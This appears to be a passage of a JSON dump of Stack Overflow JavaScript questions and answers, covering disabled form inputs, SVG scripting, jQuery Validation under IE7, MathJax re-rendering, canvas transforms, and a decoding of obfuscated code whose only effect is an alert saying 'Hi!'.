                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<blockquote>\n  <p>The HTML standard for forms appears to be such that disabled input elements do not contribute to the form name/value collection.</p>\n</blockquote>\n\n<p>That is correct.</p>\n\n<p>HACK: You could use Javascript to, upon submit:</p>\n\n<ol>\n<li>Unset disabled</li>\n<li>Set readonly</li>\n<li>Submit!</li>\n</ol>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>As a slightly more robust variant of Wayne's hack (which might get confused by a Back button push), when disabling a control: set <code>readonly= true</code> and <code>className= 'disabled'</code> instead of <code>disabled= true</code>, then style <code>.disabled</code> to look similar to a disabled field.</p>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>You should use the <code>readOnly</code> flag rather than <code>disabled</code>. Read-only fields cannot be edited by the user, but are still submitted with the form.</p>\n\n<pre><code>&lt;input type=\"text\" value=\"blah\" readOnly=\"true\"/&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 43
                },
                {
                    "body": "<p>If you make the value <strong>readonly</strong>, instead of disabling it, the field's name/value will be sent with the rest of the non-disabled fields.</p>\n\n<p>Make the readonly fields' focus event handler pass the focus to the next eligible field, to make it act more like a disabled element. Some browsers let you focus and select readonly fields, and some even let you paste into a readonly field, though they revert to the original value onblur and onchange. </p>\n\n<pre><code>&lt;input type=\"text\" value=\"\" readonly=\"readonly\"&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>Instead of setting field as disable set readonly attribute to \"readonly \" like shown below.\nreadonly=readonly</p>\n\n<p>this will send your field value in form submit.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I whipped up a quick (Jquery only) plugin, that saves the value in a data field while an input is disabled.\nThis just means as long as the field is being disabled programmaticly through jquery using .prop() or .attr()... then accessing the value by .val(), .serialize() or .serializeArra() will always return the value even if disabled :)</p>\n\n<p><a href=\"https://github.com/Jezternz/jq-disabled-inputs\" rel=\"nofollow\">https://github.com/Jezternz/jq-disabled-inputs</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Its Simple only two steps</p>\n\n<ol>\n<li><p>check if the input you want to access is disabled if it is then remove its \"disabled\" attribute</p></li>\n<li><p>Get the value and then add the disabled attribute again.</p></li>\n</ol>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>The HTML standard for forms appears to be such that disabled input elements do not contribute to the form name/value collection.</p>\n\n<p>Is there ANY way to get around this?  I need to be able to toggle disable on and off but still return whatever the value is when the form is submitted.</p>\n\n<p>I realize that I can use JavaScript to copy the value to a hidden input before the form is submitted, but I would prefer not to.  Is there a cleaner way?</p>\n\n<p>I'm using ASP.NET, not that that matters.</p>\n",
            "last_activity_date": 1409826573,
            "question_id": 524222,
            "score": 16,
            "tags": [
                "javascript",
                "html",
                "xhtml"
            ],
            "title": "How can I get the form value from a disabled &lt;input&gt; element"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>1/ probably never - if IE wanted to add it, then I would have though it would have done so by now; but there are workarounds using <a href=\"http://www.intertwingly.net/blog/2007/05/04/Inline-SVG-in-MSIE\" rel=\"nofollow\">SilverLight</a> and <a href=\"http://starkravingfinkle.org/blog/2006/03/svg-in-ie-update/\" rel=\"nofollow\">Gecko</a> to provide rendering. On the other hand, there are cross-browser graphics APIs available. I've done largish front ends using XULRunner and SVG, but nothing on the web which had to cater for IE.</p>\n\n<p>2/ The two I referred to most often were the <a href=\"http://www.mozilla.org/projects/svg/\" rel=\"nofollow\">SVG pages on mozilla.org</a> and this <a href=\"http://phrogz.net/ObjJob/objects.asp?langID=1\" rel=\"nofollow\">SVG DOM reference</a> . All of my SVG links are here on <a href=\"http://delicious.com/MachineElf/svg\" rel=\"nofollow\">delicious</a></p>\n\n<p>There's one existing editor at <a href=\"http://www.bpel4chor.org/editor/\" rel=\"nofollow\">http://www.bpel4chor.org/editor/</a>; also if all you want is schematics where all arcs are on a grid, you can do that quite well using divs and images without SVG. Or you could just go the <a href=\"http://www.tincancamera.com/blog/2005/03/lo-fi-uml.html\" rel=\"nofollow\">lo-fi route</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Unfortunately, I don't have an answer, but I do have three pointers to projects that you could look at.</p>\n\n<p>The first is the <a href=\"http://Research.Sun.Com/projects/lively/\">Lively Kernel</a> by Dan Ingalls (yes, <em>the</em> Dan Ingalls) at Sun Labs. It is an implementation of a Smalltalk Virtual World in JavaScript on top of SVG. More precisely, it is an implementation of the Morphic GUI framework from Squeak Smalltalk in JavaScript using SVG and a port of (parts of) Squeak Smalltalk in JavaScript.</p>\n\n<p>Or, if you're not a Smalltalker and the above doesn't make sense to you: it's an Operating System, written in JavaScript with the JavaScript interpreter as the CPU, SVG as the graphics card and the browser as the computer.</p>\n\n<p>This is about as extreme as it gets, when it comes to JavaScript and SVG. And it only <em>fully</em> works in Safari 3 and partly in Firefox 3, although there is an experimental port to Internet Explorer as well.</p>\n\n<p>The second project is John Resig's <a href=\"http://EJohn.Org/blog/processingjs/\">Processing.js</a> port of the Processing visualization language to JavaScript. It uses the <code>&lt;canvas&gt;</code> element instead of SVG precisely because of the problems that you mentioned. This one however, only works in Firefox 3.</p>\n\n<p>The third one is <a href=\"http://UselessPickles.Com/triangles/demo.html\">Real-Time 3D in JavaScript</a> by Useless Pickles. It uses <em>only</em> JavaScript, DOM and CSS and <em>no</em> SVG or <code>&lt;canvas&gt;</code> or Flash or whatever. <em>And</em> it is portable to almost any browser, including Internet Explorer 7 and up. Doing 2D should be even easier than this.</p>\n\n<p>Between those three projects you should be able to find some inspiration and also to find some people who tried to push the envelope with JavaScript and SVG or JavaScript and Graphics and can tell you what works and what doesn't.</p>\n\n<p>Conclusion: doing cross-browser SVG or cross-browser <code>&lt;canvas&gt;</code> is nigh impossible, but with a little bit of craziness, cross-browser graphics <em>without</em> SVG or <code>&lt;canvas&gt;</code> is possible.</p>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p>As @jwmittag mentioned <code>&lt;canvas&gt;</code> is an option. </p>\n\n<p>It works in Saffari and Firefox 3, Opera 9, and <a href=\"http://arstechnica.com/news.ars/post/20080819-mozilla-drags-ie-into-the-future-with-canvas-element-plugin.html\" rel=\"nofollow\">people are developing support for IE</a>.</p>\n\n<p>You could easily capture mouse clicks associated with the current tool and properties. \nRedrawing the canvas on every page display. </p>\n\n<p>I just finished a project using <code>&lt;canvas&gt;</code> and it's a simple and very powerful API to work with, especially if you have ever done any OpenGL or Cairo work. </p>\n\n<p>Good Luck, sounds like a cool project. </p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p><a href=\"http://raphaeljs.com/\">Raphael</a> looks like an interesting take on the problem of cross-browser vector graphics.</p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>SVGWeb is a script that adds near-native SVG capabilities to IE using flash. All the other major browsers support SVG.</p>\n\n<p><a href=\"http://code.google.com/p/svgweb/\" rel=\"nofollow\">http://code.google.com/p/svgweb/</a></p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I'm considering developing a website similar to stackoverflow, but the answers may also consist of drawings (schematics, in this case).  I want to have an area in the answer form where they can make this schematic without requiring special plugins, etc.  </p>\n\n<ol>\n<li>Are we to the point where SVG has or should have critical mass soon (1-2 years) such that designing a website where script-run SVG as a primary feature is reasonable (ie, requiring Firefox or another SVG/AJAX compliant browser)?</li>\n<li>What are some good resources for learning cross platform SVG scripting (likely in javascript)?</li>\n</ol>\n\n<p>-Adam Davis</p>\n",
            "last_activity_date": 1305651901,
            "question_id": 33347,
            "score": 16,
            "tags": [
                "javascript",
                "ajax",
                "svg"
            ],
            "title": "Scripting SVG"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>It's possible that you have 3rd party cookies blocked. To test this on my Chrome (Version  26.0.1410.43) I added exceptions for :-</p>\n\n<ul>\n<li>apis.google.com</li>\n<li>plusone.google.com</li>\n<li>clients6.google.com</li>\n<li>gstatic.com</li>\n</ul>\n\n<p>After that the +1 button worked for me.</p>\n\n<p>Regards,</p>\n\n<p>Dan</p>\n",
                    "is_accepted": true,
                    "score": 19
                }
            ],
            "body": "<p>Google PlusOne has errors on Chrome:</p>\n\n<pre><code>Uncaught ReferenceError: iframes is not defined fastbutton:19\nUncaught ReferenceError: iframes is not defined fastbutton:19\nUncaught TypeError: Cannot read property 'plusones' of undefined (program):66\nUncaught TypeError: Object #&lt;Object&gt; has no method 'hefn' fastbutton:16\n</code></pre>\n\n<p>the [not-so-]funny part is that it works on IE and on FireFox.</p>\n\n<p>I should also add that it was working for a while properly and I only see these errors now.  not sure what has changed.</p>\n\n<p>any ideas?  TIA</p>\n\n<p>p.s. I also have jQuery and a bare bone Modernizr on that page.</p>\n",
            "last_activity_date": 1364915834,
            "question_id": 15214781,
            "score": 15,
            "tags": [
                "javascript",
                "google-chrome",
                "google-api",
                "google-plus-one"
            ],
            "title": "Google PlusOne Button has errors on Chrome"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Looks like it's a bug with IE10 in compatibility mode as it is reported to work in IE7. But there are some jquery workarounds posted here:\n<a href=\"http://bugs.jquery.com/ticket/12577\">http://bugs.jquery.com/ticket/12577</a></p>\n",
                    "is_accepted": true,
                    "score": 22
                },
                {
                    "body": "<p>What I found causing the problem is line 35 of jquery.validate.js</p>\n\n<pre><code>this.attr('novalidate', 'novalidate');\n</code></pre>\n\n<p>Comment out this line and problem is sovled. You could also wrap it with a  ( current browser &lt;= ie7) to explictly avoid this line only when ie7 is the broswer.</p>\n\n<p><strong>Update</strong>\nTo comment out line only for ie7 you can use the following code:</p>\n\n<pre><code>var ie = (function () {\n        var undef,\n    v = 3,\n    div = document.createElement('div'),\n    all = div.getElementsByTagName('i');\n        while (\n    div.innerHTML = '&lt;!--[if gt IE ' + (++v) + ']&gt;&lt;i&gt;&lt;/i&gt;&lt;![endif]--&gt;',\n    all[0]\n);\n        return v &gt; 4 ? v : undef;\n    } ());\n</code></pre>\n\n<p>and then:</p>\n\n<pre><code>    if (!ie || ie &gt; 7) {\n      this.attr('novalidate', 'novalidate');\n    }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>I was going to add a comment to the answer from Xaris, but wanted to give a little extra info in a full answer.  I changed the line in jQuery.validate.js to:</p>\n\n<pre><code>if (!$.browser.msie || $.browser.version &gt; 7) {\n    this.attr(\"novalidate\", \"novalidate\");\n}\n</code></pre>\n\n<p>However, $.browser was removed from jQuery in version 1.9, so I had to add the jQuery Migrate plugin (this is an official jQuery plugin).</p>\n\n<p>If you are using nuget packages in .NET and you use the bundling feature, then keep in mind that you can manually update jQuery.validate.js, but the problem will still exist in jQuery.validate.min.js.  I had to delete the minified version so that the bundling wouldn't pick it up in production.  It's bad practice to be editing the nuget supplied files as my changes will be overwritten when the package is updated, but this is the best fix for this issue right now.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p><strong>My similar problem</strong></p>\n\n<p>I had the same <code>SCRIPT3: Member not found</code> issue in IE11 due to the defined X-UA-Compatible:</p>\n\n<pre><code>&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" /&gt;\n</code></pre>\n\n<p><strong>My solution</strong></p>\n\n<p>In my case, in these days, the application requirements are IE8+.</p>\n\n<p>So, to fix the problem, just remove the meta tag or change it to:</p>\n\n<pre><code>&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" /&gt;\n</code></pre>\n\n<p><strong>Solution to OP's case (or any similar issue)</strong></p>\n\n<p>Depending on the compatibility requirements, it may be used the same solution that I used.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Hello problem from jQuery validation</p>\n\n<p><a href=\"https://github.com/jzaefferer/jquery-validation/issues/845\" rel=\"nofollow\">https://github.com/jzaefferer/jquery-validation/issues/845</a></p>\n\n<p>Change line 33 of the jquery Validation plugin from:</p>\n\n<pre><code>this.attr( \"novalidate\", \"novalidate\" );\n</code></pre>\n\n<p>to</p>\n\n<pre><code>this.prop( \"novalidate\", \"novalidate\" );\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I have the following:</p>\n\n<pre><code>&lt;html&gt;\n    &lt;head&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;div&gt;\n            &lt;form method=\"post\"&gt;\n                &lt;div id=\"questions\"&gt;    \n                    &lt;label for=\"question-6\"&gt;Name of Course:&lt;/label&gt;\n                    &lt;input type=\"text\" name=\"name_of_course[response]\" value=\"\" id=\"question-6\" class=\"required\"&gt;\n                    &lt;label class=\"control-label\" for=\"reporting-year\"&gt;Reporting Year: &lt;/label&gt;\n                    &lt;select name=\"reporting_year\" id=\"reporting-year\"&gt;\n                        &lt;option value=\"-1\" selected=\"selected\"&gt;Select option...&lt;/option&gt;\n                        &lt;option value=\"4\"&gt;2013-2014&lt;/option&gt;\n                        &lt;option value=\"1\"&gt;2012-2013&lt;/option&gt;\n                        &lt;option value=\"2\"&gt;2011-2012&lt;/option&gt;\n                        &lt;option value=\"3\"&gt;2010-2011&lt;/option&gt;\n                    &lt;/select&gt;\n                &lt;/div&gt;\n                &lt;input type=\"submit\" name=\"submit\" value=\"Save Entry\" class=\"btn\"&gt;\n            &lt;/form&gt;\n        &lt;/div&gt;\n        &lt;script src=\"//code.jquery.com/jquery.js\"&gt;&lt;/script&gt;\n        &lt;script src=\"//ajax.aspnetcdn.com/ajax/jquery.validate/1.10.0/jquery.validate.min.js\"&gt;&lt;/script&gt;\n        &lt;script&gt;\n            $(function(){\n                jQuery.validator.addMethod(\"notEqual\", function(value, element, param) {\n                        return this.optional(element) || value !== param;\n                        }, \"Please select an option\");\n                $('form').validate({\n                    rules:{\n                        'reporting_year': {\n                            notEqual: \"-1\"\n                        }\n                    }\n                });\n            });\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Everyone's favorite browser, IE7 (IE10 w/compatibility really) is reporting the following error in the console:</p>\n\n<blockquote>\n  <p>SCRIPT3: Member not found.</p>\n  \n  <p>jquery.js, line 2525 character 4</p>\n</blockquote>\n\n<p>Of course IE8 and above work fine, but my client is using IE7.</p>\n",
            "last_activity_date": 1408400300,
            "question_id": 13462569,
            "score": 15,
            "tags": [
                "javascript",
                "jquery",
                "jquery-validate",
                "internet-explorer-7",
                "compatibility-mode"
            ],
            "title": "jQuery Validation plugin, IE7 &quot;SCRIPT3: Member not found&quot;"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>See <a href=\"http://docs.mathjax.org/en/latest/typeset.html\" rel=\"nofollow\">http://docs.mathjax.org/en/latest/typeset.html</a>:</p>\n\n<blockquote>\n  <p>If you are writing a dynamic web page\n  where content containing mathematics\n  may appear after MathJax has already\n  typeset the rest of the page, then you\n  will need to tell MathJax to look for\n  mathematics in the page again when\n  that new content is produced. To do\n  that, you need to use the\n  <code>MathJax.Hub.Typeset()</code> method. This\n  will cause the preprocessors (if any\n  were loaded) to run over the page\n  again, and then MathJax will look for\n  unprocessed mathematics on the page\n  and typeset it, leaving unchanged any\n  math that has already been typeset.</p>\n  \n  <p>You should not simply call this method directly, however. [You should instead] queue the typeset action, [using this] command:</p>\n  \n  <p><code>MathJax.Hub.Queue([\"Typeset\",MathJax.Hub]);</code></p>\n</blockquote>\n\n<p>Demo here: <a href=\"http://cdn.mathjax.org/mathjax/latest/test/sample-dynamic.html\" rel=\"nofollow\">http://cdn.mathjax.org/mathjax/latest/test/sample-dynamic.html</a></p>\n",
                    "is_accepted": true,
                    "score": 20
                },
                {
                    "body": "<p>I found the simplest way to do dynamic updates with MathML is to let MathJax do the content changes (instead of the jQuery .html(s) function, e.g.) Then it processes the math while changing the content.  </p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n   function updateMathContent(s) {\n       var math = MathJax.Hub.getAllJax(\"mathdiv\")[0];\n       MathJax.Hub.Queue([\"Text\", math, s]);\n   }\n&lt;/script&gt;\n</code></pre>\n\n<p>...</p>\n\n<pre><code>&lt;div id=\"mathdiv\"&gt;\n   &lt;math xmlns=\"http://www.w3.org/1998/Math/MathML\"&gt;\n      &lt;msup&gt;\n         &lt;mi&gt;x&lt;/mi&gt;\n         &lt;mn&gt;2&lt;/mn&gt;\n       &lt;/msup&gt; \n   &lt;/math&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>So just use the function to replace the entire contents of the div with new MathML and it will work. (The script goes in the head.)</p>\n\n<p>Note: If you have an empty math div and add MathML later, you will get a script error. But if the math tags are present with nothing inside the call to updateMathContent will work. </p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I need MathJax to recheck again all my page.</p>\n\n<p>I mean when the page is created it does all great. But I need to call it after window.onload to reparse the page, as its contents have changed in the meantime.</p>\n\n<p>How would I do such a thing?</p>\n",
            "last_activity_date": 1424083857,
            "question_id": 5200545,
            "score": 15,
            "tags": [
                "javascript",
                "html",
                "restart",
                "mathjax"
            ],
            "title": "How to recall or restart MathJax?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>The transformation matrix they are referring to is the common transformation matrix found in linear algebra.  Those arguments form the transformation matrix you wish to apply to your coordinates for the given shapes or paths.  This <a href=\"http://www.whatwg.org/specs/web-apps/current-work/multipage/the-canvas-element.html#transformations\">page</a> describes the transformation method.  Please look specifically at the matrix they define under the method signature for transformation.  It shows you which parameters go where in transformation matrix.  Now please also refer to the following <a href=\"http://www.senocular.com/flash/tutorials/transformmatrix/\">link</a>.  If you scroll down you will see what each element in the transformation matrix means.  For instance the [0,0] element (parameter a from the HTML5 transform  method signature) of the transformation matrix represents how the coordinate will scale in the X direction.  Hope this helps,</p>\n",
                    "is_accepted": true,
                    "score": 10
                },
                {
                    "body": "<p>The transformation matrix gets multiplied by each point before it's drawn on the canvas. Like @Eric said, it's an <a href=\"http://en.wikipedia.org/wiki/Transformation_matrix#Affine_transformations\">affine transformation matrix</a> from linear algebra. In your example, it would work like this:</p>\n\n<pre><code>[ x']   [ 1 0 -551.23701 ] [ x ]   [ x - 551.23701 ]\n[ y'] = [ 0 1 -368.42499 ] [ y ] = [ y - 368.42499 ]\n[ 1 ]   [ 0 0    1       ] [ 1 ]   [       1       ]\n</code></pre>\n\n<p>So it shifts the x and y coordinates by -551.23... and -368.42... respectively.</p>\n\n<p>Other types of transformations involve different \"slots\" in the matrix. For example, here's the matrix that scales the drawing by <code>sx</code> and <code>sy</code> (x and y scaling factors):</p>\n\n<pre><code>[ sx  0 0 ]\n[  0 sy 0 ]\n[  0  0 1 ]\n</code></pre>\n\n<p>and rotation (angle is in radians):</p>\n\n<pre><code>[ cos(angle) -sin(angle) 0 ]\n[ sin(angle)  cos(angle) 0 ]\n[     0           0      1 ]\n</code></pre>\n\n<p>The advantage of using a transformation matrix over calling individual methods, like <code>translate</code>, <code>scale</code>, and <code>rotate</code>, is that you can perform all the transformations in one step. It gets complicated though when you start combining them in non-trivial ways because you need to multiply the matrices together to get the final result (this is what functions like <code>scale</code>, etc. are doing for you). It's almost always easier to call each function instead of calculating it yourself.</p>\n\n<p>The links @Eric mentioned and the <a href=\"http://en.wikipedia.org/wiki/Transformation_matrix\">transformation matrix article on Wikipedia</a> go into a lot more detail about how it all works.</p>\n",
                    "is_accepted": false,
                    "score": 24
                },
                {
                    "body": "<p>I found the examples on Apple's page to be helpful in understanding the transformation matrix:</p>\n\n<p><a href=\"http://developer.apple.com/library/safari/#documentation/AudioVideo/Conceptual/HTML-canvas-guide/MatrixTransforms/MatrixTransforms.html\" rel=\"nofollow\">http://developer.apple.com/library/safari/#documentation/AudioVideo/Conceptual/HTML-canvas-guide/MatrixTransforms/MatrixTransforms.html</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I have implemented a very simple <a href=\"http://simonsarris.com/blog/471-a-transformation-class-for-canvas-to-keep-track-of-the-transformation-matrix\">Transformation class to keep track of the Canvas transformation matrix.</a> You can use it to see just how the matrix works and what it is doing. The class will also allow you to keep track of the matrix since the Canvas won't allow you to retrieve the current matrix.</p>\n",
                    "is_accepted": false,
                    "score": 9
                }
            ],
            "body": "<p>I don't understand what the Transformation Matrix is and how to work with it.</p>\n\n<p>The following will draw a circle at 0, 0 of my canvas: <em>(generated from an svg converted with svg2canvas.jar)</em></p>\n\n<pre><code>drawPoints: function(ctx, max_points)\n        {\n            ctx.save();\n\n            ctx.setTransform(1, 0, 0, 1, -551.23701, -368.42499);\n\n            ctx.fillStyle=\"#0066ab\";\n            ctx.globalAlpha=\"0.7\";\n            ctx.beginPath();\n            ctx.moveTo(584.50,387.96);\n            ctx.bezierCurveTo(584.50,397.14,577.05,404.59,567.87,404.59);\n            ctx.bezierCurveTo(558.68,404.59,551.24,397.14,551.24,387.96);\n            ctx.bezierCurveTo(551.24,378.77,558.68,371.33,567.87,371.33);\n            ctx.bezierCurveTo(577.05,371.33,584.50,378.77,584.50,387.96);\n            ctx.closePath();\n            ctx.fill();\n\n            ctx.restore();\n        }\n</code></pre>\n\n<p>I would like to pass in arguments for setTransform() to draw on any part of my canvas, however I don't understand how to use it at all.</p>\n",
            "last_activity_date": 1378294771,
            "question_id": 3630594,
            "score": 15,
            "tags": [
                "javascript",
                "html5",
                "canvas"
            ],
            "title": "HTML5 Canvas Transformation Matrix"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>jQuery becomes irrelevant in the first line of code:</p>\n\n<pre><code>$ = ~[];\n</code></pre>\n\n<p>This results in <code>-1</code>. Right after it, you see an object being assigned to <code>$</code> making references to it at the same time, like:</p>\n\n<pre><code>___: ++$,              // $.___ is now 0\n$$$$: (![] + \"\")[$],   // $.$$$$ is f (false[0] = f)\n__$: ++$,              // 1\n$_$_: (![] + \"\")[$],   // a (false[1] = a)\n_$_: ++$,              // 2\n$_$$: ({} + \"\")[$],    // b (\"[object Object]\"[2])\n$$_$: ($[$] + \"\")[$],  // d (\"undefined\"[2])\n_$$: ++$,              // 3\n$$$_: (!\"\" + \"\")[$],   // e (\"true\"[3])\n$__: ++$,              // 4\n$_$: ++$,              // 5\n$$__: ({} + \"\")[$],    // c (\"[object Object]\"[5])\n$$_: ++$,              // 6\n$$$: ++$,              // 7\n$___: ++$,             // 8\n$__$: ++$              // 9\n</code></pre>\n\n<p>And so on... If you get piece by piece and execute it you will see how Javascript behaves. Eventually you will find that your code calls alert by making js output values through these evaluations and combine them into <code>alert</code>.</p>\n\n<p>This question reminds me of <a href=\"http://stackoverflow.com/q/3910353/340760\">Obfuscated javascript code with binary values?</a></p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>If you notice, by assigning a value to <code>$</code> (<code>$</code> becomes an integer) immediately, jquery is actually never used in this code.</p>\n\n<pre><code>// ~ is bitwise not, so this set $ = -1\n$ = ~ [];\n</code></pre>\n\n<p>The following code creates a javascript object. Since <code>![]</code> is <code>false</code>, <code>(![] + \"\")</code> converts the boolean to a string, <code>\"false\"</code>. Each <code>[$]</code> is grabbing a letter at the specified index, <code>$</code>, in the string, <code>\"false\"</code> or various other return values. The code stores a series of integers and letters in an object and then assigns it to <code>$</code>.</p>\n\n<pre><code>$ = { \n    ___: ++$, // 0 since $ was -1\n    $$$$: (![] + \"\")[$], // \"f\"\n    __$: ++$, // 1\n    $_$_: (![] + \"\")[$], // \"a\"\n    _$_: ++$, // 2\n    $_$$: ({} + \"\")[$],\n    $$_$: ($[$] + \"\")[$], // \"b\"\n    _$$: ++$, // see the patter when ++$ is assigned?\n    $$$_: (!\"\" + \"\")[$], // see the pattern with the letters?\n    $__: ++$,\n    $_$: ++$,\n    $$__: ({} + \"\")[$],\n    $$_: ++$,\n    $$$: ++$,\n    $___: ++$,\n    $__$: ++$\n};\n</code></pre>\n\n<p>The ideas that follows are similar to that above. Each piece (separated by the +) returns a letter based on the return value, which are then combined to form a string.</p>\n\n<pre><code>// \"constructor\"\n$.$_ = ($.$_ = $ + \"\")[$.$_$] + ($._$ = $.$_[$.__$]) + ($.$$ = ($.$ + \"\")[$.__$]) + ((!$)      + \"\")[$._$$] + ($.__ = $.$_[$.$$_]) + ($.$ = (!\"\" + \"\")[$.__$]) + ($._ = (!\"\" + \"\")[$._$_]) +     $.$_[$.$_$] + $.__ + $._$ + $.$;\n</code></pre>\n\n<p>The code below assigns <code>\"return\"</code> and <code>function Function() { [native code] }</code>.</p>\n\n<pre><code>// \"return\"\n$.$$ = $.$ + (!\"\" + \"\")[$._$$] + $.__ + $._ + $.$ + $.$$;\n// function Function() { [native code] }\n$.$ = ($.___)[$.$_][$.$_];\n</code></pre>\n\n<p>In the final lines, </p>\n\n<pre><code>$.$$ + \"\\\"\" + $.$_$_ + (![] + \"\")[$._$_] + $.$$$_ + \"\\\\\" + $.__$ + $.$$_ + $._$_ +        $.__ + \"(\\\\\\\"\\\\\" + $.__$ + $.__$ + $.___ + \"\\\\\" + $.__$ + $.$_$ + $.__$ + \"!\\\\\\\");\" + \"\\\"\"`\n</code></pre>\n\n<p>is equivalent to </p>\n\n<pre><code>\"return\"ale\\162t(\\\"\\110\\151!\\\");\"\"\n</code></pre>\n\n<p>When passed to <code>$.$()</code>, it becomes a function </p>\n\n<pre><code>function anonymous() { return \"alert(\\\"Hi!\\\");\"; }\n</code></pre>\n\n<p>Then the final statement that actually executes the alert.</p>\n\n<pre><code>$.$($.$($.$$ + \"\\\"\" + $.$_$_ + (![] + \"\")[$._$_] + $.$$$_ + \"\\\\\" + $.__$ + $.$$_ + $._$_ + $.__ + \"(\\\\\\\"\\\\\" + $.__$ + $.__$ + $.___ + \"\\\\\" + $.__$ + $.$_$ + $.__$ + \"!\\\\\\\");\" + \"\\\"\")())();\n</code></pre>\n\n<p>To make the whole concept easier to understand, I've provided semi-deobfuscated code as well.</p>\n\n<pre><code>obj = {\n    ___: ++index, // = 0\n    $$$$: (![] + \"\")[index], // = \"f\" from 'f'alse\n    __$: ++index, // = 1\n    $_$_: (![] + \"\")[index], // = \"a\" from f'a'lse\n    _$_: ++index, // = 2\n    $_$$: ({} + \"\")[index], // = \"b\" from [o'b'ject Object]\n    $$_$: (index[index] + \"\")[index], // = \"d\" from un'd'efined\n    _$$: ++index, // = 3\n    $$$_: (!\"\" + \"\")[index], // = \"e\" from tru'e'\n    $__: ++index, // = 4\n    $_$: ++index, // = 5\n    $$__: ({} + \"\")[index], // = \"c\" from [obje'c't Object]\n    $$_: ++index, // = 6\n    $$$: ++index, // = 7\n    $___: ++index, // = 8\n    $__$: ++index // = 9\n};\n\n// obj.$_ = \"c\" + \"o\" + \"n\" + \"s\" + \"t\" + \"r\" + \"u\" + \"c\" + \"t\" + \"o\" + \"r\";\nobj.$_ = (obj.$_ = obj + \"\")[obj.$_$] + (obj._$ = obj.$_[obj.__$]) + (obj.$$ = (obj.$ + \"\")[obj.__$]) + ((!obj) + \"\")[obj._$$] + (obj.__ = obj.$_[obj.$$_]) + (obj.$ = (!\"\" + \"\")[obj.__$]) + (obj._ = (!\"\" + \"\")[obj._$_]) + obj.$_[obj.$_$] + obj.__ + obj._$ + obj.$;\n\n// obj.$$ = \"r\" + \"e\" + \"t\" + \"u\" + \"r\" + \"n\"\nobj.$$ = obj.$ + (!\"\" + \"\")[obj._$$] + obj.__ + obj._ + obj.$ + obj.$$;\n\n// obj.$ = function Function() { [native code] } &lt;- a function constructor\nobj.$ = (obj.___)[obj.$_][obj.$_];\n\n// If you don't know what Function() is, read\n// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function to learn about Function()\n// before continuing.  It'll make more sense.\n\n// body1 = \"return\"ale\\162t(\\\"\\110\\151!\\\");\"\";\nbody1 = obj.$$ + \"\\\"\" + obj.$_$_ + (![] + \"\")[obj._$_] + obj.$$$_ + \"\\\\\" + obj.__$ +    obj.$$_ + obj._$_ + obj.__ + \"(\\\\\\\"\\\\\" + obj.__$ + obj.__$ + obj.___ + \"\\\\\" + obj.__$ +       obj.$_$ + obj.__$ + \"!\\\\\\\");\" + \"\\\"\";\n\n// body2 = \"alert(\"Hi!\");\" since \\162 = \"r\", \\\"\\110\\151\\!\" = \"Hi!\"\nbody2 = obj.$(body1)();\n\n// calls \"alert(\"Hi!\");\"\nobj.$(body2)();\n\n// This works because the last argument to Function() becomes the\n// body of that function.\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 8
                }
            ],
